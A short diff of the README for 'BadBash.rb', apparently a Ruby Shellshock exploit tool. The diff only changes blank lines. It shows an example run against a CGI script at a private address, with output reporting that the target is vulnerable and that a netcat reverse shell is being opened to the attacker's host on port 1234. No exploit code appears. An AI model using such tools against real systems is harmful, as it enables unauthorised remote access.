@@ -8,7 +8,6 @@ Version : 0.1.0
 License : GPLv3
 
 ================================================================================================
-
 RainMak3r@Could:~/Desktop# ruby BadBash.rb  -h
    ___           _   ___          _     
   / __\ __ _  __| | / __ __ _ ___| |__  
@@ -33,9 +32,13 @@ Example of usage.
 RainMak3r@Could:~/Desktop#ruby BadBash.rb -t '172.16.235.140/cgi-bin/Andy.sh' -d '172.16.189.1'
 
 [Info]     Checking if the target is vulnerable........
+
 [Info]     This may take up to 10 seconds........
+
 [Info]     Target is vulnerable!!!
+
 [Info]     Please use NC to listen on port 1234 for reverse shell..........
+
 [Info]     Exploiting for a reverse shell to connect 172.16.189.1:1234 via netcat ..........
 
 
